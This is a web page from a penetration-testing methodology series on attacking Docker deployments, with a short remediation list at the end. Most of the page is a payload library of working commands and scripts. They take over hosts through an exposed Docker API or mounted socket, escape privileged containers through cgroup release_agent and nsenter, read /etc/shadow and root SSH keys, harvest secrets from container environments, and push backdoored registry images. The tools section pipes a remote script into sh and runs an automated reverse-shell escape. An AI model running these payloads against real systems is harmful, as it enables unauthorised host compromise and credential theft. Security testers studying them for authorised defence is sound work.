---
title: "Docker Security Testing"
date: 2026-02-24
draft: false
---

# Docker Security Testing

> **Severity**: Critical | **CWE**: CWE-284, CWE-269
> **OWASP**: A05:2021 – Security Misconfiguration | A01:2021 – Broken Access Control

---

## What Is the Docker Attack Surface?

Docker's attack surface includes the Docker daemon REST API (accessible via UNIX socket or TCP), container escape via privileged containers and dangerous volume mounts, container image vulnerabilities, and insecure registries. A single misconfiguration — like exposing the Docker socket to a container — typically results in full host compromise.

```
Docker attack paths:
  External → Docker daemon API on TCP 2375 (unauthenticated) → host RCE
  Container → /var/run/docker.sock mounted inside → daemon control → escape
  Container → privileged flag → full host kernel access → escape via /dev
  Container → hostPath mount of / → read/write entire host filesystem
  Container → CAP_SYS_ADMIN capability → overlay FS trick → host namespace
  External → insecure registry (port 5000) → pull/push images → backdoor
```

---

## Discovery Checklist

**Phase 1 — External Exposure**
- [ ] Scan for TCP 2375 (Docker HTTP, unauthenticated) and 2376 (Docker HTTPS, may have weak certs)
- [ ] Scan for Docker registry: TCP 5000 (local), TCP 443/80 (hosted)
- [ ] Check for docker-compose.yml files in web roots or exposed via directory traversal
- [ ] Check for Portainer (TCP 9000), Rancher (TCP 443/80), or other Docker management UIs

**Phase 2 — Container Context**
- [ ] Check if Docker socket is mounted: `ls -la /var/run/docker.sock`
- [ ] Check container privileges: `cat /proc/1/status | grep -i cap`
- [ ] Check for `--privileged` flag: `cat /proc/self/status | grep NoNewPrivs`
- [ ] Check for dangerous capabilities: `capsh --print 2>/dev/null`
- [ ] Check accessible devices: `ls /dev/`
- [ ] Check for hostPath mounts: `cat /proc/mounts | grep -v 'overlay\|proc\|sys\|dev\|run'`
- [ ] Check environment for credentials: `env | grep -iE 'pass|key|token|secret|cred'`

**Phase 3 — Exploitation Path Selection**
- [ ] Docker socket mounted → use docker binary or API
- [ ] Privileged + host devices → mount host filesystem via /dev
- [ ] CAP_SYS_ADMIN → runc/cgroup escape
- [ ] Shared namespaces (hostPID, hostNet, hostIPC) → lateral movement
- [ ] Weak image → running as root + writable host mount

---

## Payload Library

### Payload 1 — Docker API (TCP 2375) Unauthenticated RCE

```bash
# Verify Docker API is exposed and unauthenticated:
curl http://TARGET:2375/version
curl http://TARGET:2375/containers/json

# List running containers:
curl http://TARGET:2375/containers/json | python3 -m json.tool | \
  python3 -c "
import sys, json
for c in json.load(sys.stdin):
    print(c['Id'][:12], c['Image'], c['Status'])
"

# List all containers including stopped:
curl "http://TARGET:2375/containers/json?all=1" | python3 -m json.tool

# Execute command in existing container:
# Step 1: Create exec session:
curl -X POST "http://TARGET:2375/containers/CONTAINER_ID/exec" \
  -H "Content-Type: application/json" \
  -d '{"AttachStdout":true,"AttachStderr":true,
       "Cmd":["/bin/sh","-c","id; whoami; cat /etc/passwd"]}'

# Step 2: Start exec session:
EXEC_ID=$(curl -sX POST "http://TARGET:2375/containers/CONTAINER_ID/exec" \
  -H "Content-Type: application/json" \
  -d '{"AttachStdout":true,"AttachStderr":true,"Cmd":["/bin/sh","-c","id"]}' | \
  python3 -c "import sys,json; print(json.load(sys.stdin)['Id'])")

curl -X POST "http://TARGET:2375/exec/$EXEC_ID/start" \
  -H "Content-Type: application/json" \
  -d '{"Detach":false,"Tty":false}'

# Create new container with host filesystem mounted → RCE on host:
curl -X POST "http://TARGET:2375/containers/create?name=pwn" \
  -H "Content-Type: application/json" \
  -d '{
    "Image": "alpine",
    "Cmd": ["sh", "-c", "chroot /mnt sh -c \"echo PWN > /tmp/pwned; cat /etc/shadow\""],
    "Binds": ["/:/mnt:rw"],
    "HostConfig": {
      "Binds": ["/:/mnt:rw"],
      "Privileged": true
    }
  }'

# Start the container:
curl -X POST "http://TARGET:2375/containers/pwn/start"

# Get logs:
curl "http://TARGET:2375/containers/pwn/logs?stdout=1&stderr=1"

# Full automation — pull image if needed, create, start, get output:
python3 << 'EOF'
import requests, time, json

base = "http://TARGET:2375"

# Pull alpine if not present:
requests.post(f"{base}/images/create?fromImage=alpine&tag=latest")
time.sleep(5)

# Create privileged container with host mount:
r = requests.post(f"{base}/containers/create?name=exploit",
    json={
        "Image": "alpine",
        "Cmd": ["sh", "-c", "cat /host/etc/shadow; cat /host/root/.ssh/id_rsa 2>/dev/null; crontab -l 2>/dev/null"],
        "HostConfig": {
            "Binds": ["/:/host:rw"],
            "Privileged": True
        }
    })
print("Create:", r.status_code, r.json())

requests.post(f"{base}/containers/exploit/start")
time.sleep(3)

logs = requests.get(f"{base}/containers/exploit/logs?stdout=1&stderr=1")
print("Output:", logs.content.decode(errors='replace'))

# Cleanup:
requests.post(f"{base}/containers/exploit/stop")
requests.delete(f"{base}/containers/exploit")
EOF
```

### Payload 2 — Docker Socket Escape (Inside Container)

```bash
# Check if socket is available:
ls -la /var/run/docker.sock 2>/dev/null && echo "SOCKET FOUND"

# Use docker binary if available:
docker ps  # lists host containers
docker run -v /:/host --rm -it alpine chroot /host sh

# Without docker binary — use curl via socket:
curl --unix-socket /var/run/docker.sock http://localhost/version

# Create privileged container via socket:
curl --unix-socket /var/run/docker.sock \
  -X POST http://localhost/containers/create \
  -H "Content-Type: application/json" \
  -d '{
    "Image": "alpine",
    "Cmd": ["sh", "-c", "chroot /host cat /etc/shadow; cat /host/root/.ssh/id_rsa"],
    "HostConfig": {
      "Binds": ["/:/host"],
      "Privileged": true
    }
  }'

# Start it:
curl --unix-socket /var/run/docker.sock \
  -X POST http://localhost/containers/exploit/start

# One-liner escape via socket (Python):
python3 -c "
import socket, json

def docker_request(method, path, body=None):
    s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    s.connect('/var/run/docker.sock')
    headers = f'{method} {path} HTTP/1.0\r\nHost: localhost\r\nContent-Type: application/json\r\n'
    if body:
        b = json.dumps(body).encode()
        headers += f'Content-Length: {len(b)}\r\n\r\n'
        s.send(headers.encode() + b)
    else:
        s.send((headers + '\r\n').encode())
    resp = b''
    while True:
        chunk = s.recv(4096)
        if not chunk: break
        resp += chunk
    s.close()
    return resp

# Create container:
r = docker_request('POST', '/containers/create?name=escape',
    body={
        'Image': 'alpine',
        'Cmd': ['sh', '-c', 'chroot /host cat /root/.ssh/id_rsa 2>/dev/null; cat /host/etc/shadow'],
        'HostConfig': {'Binds': ['/:/host'], 'Privileged': True}
    })
print(r[-200:].decode(errors='replace'))

# Start:
docker_request('POST', '/containers/escape/start')
import time; time.sleep(2)

# Logs:
r = docker_request('GET', '/containers/escape/logs?stdout=1&stderr=1')
print(r.decode(errors='replace'))
"
```

### Payload 3 — Privileged Container Escape

```bash
# Check if running privileged:
cat /proc/1/status | grep -i "capeff\|capbnd"
# Full capabilities (CapEff: 0000003fffffffff) → privileged

# Method 1: Mount host disk and chroot:
# Find host block device:
fdisk -l 2>/dev/null
lsblk

# Mount host root filesystem:
mkdir /mnt/host
mount /dev/sda1 /mnt/host 2>/dev/null || mount /dev/xvda1 /mnt/host 2>/dev/null
ls /mnt/host/etc/
chroot /mnt/host /bin/bash

# Method 2: cgroup release_agent escape (works in privileged containers):
# Classic "Felix Wilhelm" cgroup escape:
mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab | head -1)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo "cat /etc/shadow > $host_path/shadow_output" >> /cmd
chmod a+x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
sleep 2
cat /shadow_output  # contains /etc/shadow from host

# Method 3: Kernel module loading (CAP_SYS_MODULE → host kernel):
# If modprobe available in privileged container:
# Can load malicious kernel module → host RCE

# Method 4: nsenter into host namespaces:
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
# Once in host PID 1 namespace → full host access

# Method 5: Docker-in-Docker escape via /proc/1/root:
ls /proc/1/root/  # if this is the host's root filesystem → escape complete
cat /proc/1/root/etc/shadow
```

### Payload 4 — Container Reconnaissance

```bash
# From inside any container — gather info:

# Container metadata:
cat /proc/1/cgroup | head -5  # Container ID (long string in path)
hostname
env | sort  # Environment variables (credentials often here!)
cat /.dockerenv 2>/dev/null && echo "Inside Docker"

# Check for cloud metadata (SSRF to instance metadata):
curl -s http://169.254.169.254/latest/meta-data/ 2>/dev/null  # AWS
curl -s -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/ 2>/dev/null  # GCP
curl -s -H "Metadata: true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" 2>/dev/null  # Azure

# Network reconnaissance from container:
ip addr show  # list interfaces — note subnet
ip route show  # find gateway = Docker host IP usually

# Scan Docker host (172.17.0.1 typically):
docker_host=$(ip route | grep default | awk '{print $3}')
echo "Docker host: $docker_host"

# Scan host for exposed ports:
for port in 22 80 443 2375 2376 3306 5432 6379 9200; do
  timeout 1 bash -c "echo >/dev/tcp/$docker_host/$port" 2>/dev/null && \
    echo "Port $port OPEN on host"
done

# Check Kubernetes context:
ls /var/run/secrets/kubernetes.io/ 2>/dev/null && echo "Running in Kubernetes"
printenv | grep -iE "kubernetes|k8s|kube"

# Look for sensitive files:
find / -name "*.pem" -o -name "*.key" -o -name "id_rsa" -o -name ".env" \
  -o -name "*.conf" -o -name "*.config" 2>/dev/null | \
  grep -v '/proc\|/sys\|/dev' | head -30

# Process listing (if host PID namespace):
ps aux | grep -v ']$' | head -30

# Check for writable directories that might be shared with host:
mount | grep -v 'proc\|sysfs\|devtmpfs\|overlay\|cgroup' | grep rw
```

### Payload 5 — Registry Attack

```bash
# Probe unauthenticated Docker registry (port 5000):
# List repositories:
curl http://REGISTRY:5000/v2/_catalog | python3 -m json.tool

# List tags for a repository:
curl http://REGISTRY:5000/v2/IMAGE_NAME/tags/list | python3 -m json.tool

# Pull image manifest (contains layer hashes):
curl http://REGISTRY:5000/v2/IMAGE_NAME/manifests/latest \
  -H "Accept: application/vnd.docker.distribution.manifest.v2+json" | \
  python3 -m json.tool

# Download image layer (tar.gz containing files):
DIGEST="sha256:HASH_FROM_MANIFEST"
curl http://REGISTRY:5000/v2/IMAGE_NAME/blobs/$DIGEST -o layer.tar.gz
tar tzf layer.tar.gz | head -30  # list files
tar xzf layer.tar.gz  # extract to examine

# Search for secrets in image layers:
for layer in $(curl -s http://REGISTRY:5000/v2/IMAGE_NAME/manifests/latest \
  -H "Accept: application/vnd.docker.distribution.manifest.v2+json" | \
  python3 -c "import sys,json; [print(l['digest']) for l in json.load(sys.stdin)['layers']]"); do
  curl -s "http://REGISTRY:5000/v2/IMAGE_NAME/blobs/$layer" | \
    tar xzO 2>/dev/null | strings | grep -iE 'password|secret|token|key|aws|api' | head -10
done

# Push malicious image to writable registry:
docker pull alpine
docker tag alpine REGISTRY:5000/alpine:backdoored
# Add backdoor to image:
docker run --rm alpine sh -c 'echo "backdoor" > /tmp/evil'
docker commit $(docker ps -lq) REGISTRY:5000/IMAGE_NAME:latest
docker push REGISTRY:5000/IMAGE_NAME:latest

# Scan registry with trivy:
trivy registry REGISTRY:5000/IMAGE_NAME:latest
# Or:
docker pull REGISTRY:5000/IMAGE_NAME:latest
trivy image REGISTRY:5000/IMAGE_NAME:latest
```

### Payload 6 — Credential Harvesting from Running Containers

```bash
# Via Docker API — inspect all running containers for env vars:
curl -s http://TARGET:2375/containers/json | \
  python3 -c "
import sys, json
ids = [c['Id'] for c in json.load(sys.stdin)]
print('\n'.join(ids))
" | while read cid; do
  echo "=== Container: ${cid:0:12} ==="
  curl -s "http://TARGET:2375/containers/$cid/json" | \
    python3 -c "
import sys, json
c = json.load(sys.stdin)
env = c.get('Config', {}).get('Env', [])
for e in env:
    if any(k in e.lower() for k in ['pass', 'key', 'token', 'secret', 'cred', 'aws', 'db_']):
        print(' [CRED]', e)
"
done

# Inspect image history for sensitive data in build commands:
curl -s "http://TARGET:2375/images/IMAGE_ID/history" | \
  python3 -c "
import sys, json
for layer in json.load(sys.stdin):
    cmd = layer.get('CreatedBy', '')
    if any(k in cmd.lower() for k in ['pass', 'secret', 'key', 'token', 'aws']):
        print('[SENSITIVE BUILD CMD]', cmd[:200])
"

# Docker inspect for mounted secrets files:
curl -s "http://TARGET:2375/containers/CONTAINER_ID/json" | \
  python3 -c "
import sys, json
c = json.load(sys.stdin)
for m in c.get('Mounts', []):
    print(f\"Mount: {m.get('Source')} → {m.get('Destination')} ({m.get('Mode')})\")
"

# From inside container — read process memory for credentials:
# (requires ptrace or /proc access)
cat /proc/$(pgrep -f 'python\|node\|java\|ruby' | head -1)/environ 2>/dev/null | \
  tr '\0' '\n' | grep -iE 'pass|secret|key|token'
```

---

## Tools

```bash
# docker-bench-security — CIS Docker Benchmark checks:
git clone https://github.com/docker/docker-bench-security
cd docker-bench-security && sudo bash docker-bench-security.sh

# Trivy — container image vulnerability scanner:
trivy image TARGET_IMAGE:TAG
trivy image --severity HIGH,CRITICAL TARGET_IMAGE:TAG

# Dive — explore image layers for secrets:
dive TARGET_IMAGE:TAG

# grype — vulnerability scanner for container images:
grype TARGET_IMAGE:TAG

# deepce — Docker Privilege Escalation toolkit (from inside container):
curl -sL https://github.com/stealthcopter/deepce/raw/main/deepce.sh | sh

# amicontained — container introspection:
docker run --rm -it stealthcopter/amicontained

# CDK — Container and DevOps security toolkit:
# Comprehensive container escape and enumeration:
wget https://github.com/cdk-team/CDK/releases/latest/download/cdk_linux_amd64 -O cdk
chmod +x cdk
./cdk evaluate  # from inside container — checks all escape vectors
./cdk run shim-pwn reverse  # automated escape attempt

# Shodan for exposed Docker daemons:
shodan search "port:2375 product:Docker"
shodan search "port:2376 product:Docker"

# masscan for network-wide Docker detection:
masscan -p2375,2376 10.0.0.0/8 --rate=1000 -oJ docker_exposed.json

# Check for Portainer:
curl -s http://TARGET:9000/api/status
curl -s http://TARGET:9000/api/motd
```

---

## Remediation Reference

- **Never expose Docker daemon over TCP**: use UNIX socket only (`/var/run/docker.sock`); if remote access is needed, use SSH tunneling or Docker Context with mTLS
- **Restrict socket access**: if a container needs Docker socket access, use a proxy like `docker-socket-proxy` that limits which API calls are permitted
- **Avoid `--privileged`**: use only the specific capabilities needed (`--cap-add`) — most applications need none
- **Drop all capabilities**: `--cap-drop ALL` then add back only what's needed
- **Read-only root filesystem**: `--read-only` prevents container file system modification
- **Non-root user**: specify `USER` in Dockerfile; use `--user 1000:1000` at runtime
- **Seccomp and AppArmor**: Docker's default seccomp profile is effective — don't disable it; add custom profiles for stricter isolation
- **Registry authentication**: enable registry authentication and TLS — never run registries on port 5000 without auth in production
- **Image scanning**: scan images for known vulnerabilities in CI/CD pipeline before deployment

*Part of the Web Application Penetration Testing Methodology series.*
